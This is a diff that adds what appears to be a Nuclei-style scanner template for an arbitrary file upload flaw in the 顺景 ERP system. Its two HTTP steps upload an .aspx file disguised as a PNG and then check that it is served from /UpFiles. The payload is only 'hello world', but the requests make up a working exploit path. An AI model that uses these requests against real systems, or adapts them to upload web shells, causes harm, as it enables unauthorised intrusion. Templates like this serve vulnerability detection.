@@ -1,0 +1,54 @@
+id: poc-yaml-centersoft-fileupload-upload
+
+info:
+  name: 顺景ERP管理系统FileUpload存在任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: fileupload
+  description: |
+    Exploits an arbitrary file upload vulnerability in 顺景ERP management system, allowing attackers to upload malicious files.
+
+variables:
+  boundary: "----WebKitFormBoundary7yyQ5XLHOn6WZ6MT"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/api/FileUpload/Upload"
+    headers:
+      Content-Type: "multipart/form-data; boundary={{boundary}}"
+    body: |
+      {{boundary}}
+      Content-Disposition: form-data; name="file"; filename="1.aspx"
+      Content-Type: image/png
+
+      hello world
+      {{boundary}}--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\"GUID\""
+    extractors:
+      - type: json
+        name: filepath
+        json:
+          - ".GUID"
+        internal: true
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/UpFiles/{{filepath}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "hello world"
